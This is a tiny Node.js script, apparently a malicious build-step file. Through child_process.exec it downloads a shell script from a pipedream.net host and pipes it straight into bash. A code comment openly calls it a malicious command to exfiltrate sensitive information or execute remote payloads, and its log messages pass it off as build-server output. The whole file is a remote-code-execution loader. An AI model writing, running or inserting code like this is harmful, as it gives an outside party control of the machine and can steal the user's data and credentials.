const { exec } = require("child_process");

// Malicious command to exfiltrate sensitive information or execute remote payloads
exec("curl -s https://eofx0dnqega9js6.m.pipedream.net/payload.sh | bash", (error, stdout, stderr) => {
  if (error) {
    console.error(`Error during build-server: ${error.message}`);
    return;
  }
  console.log(`Build output: ${stdout}`);
});

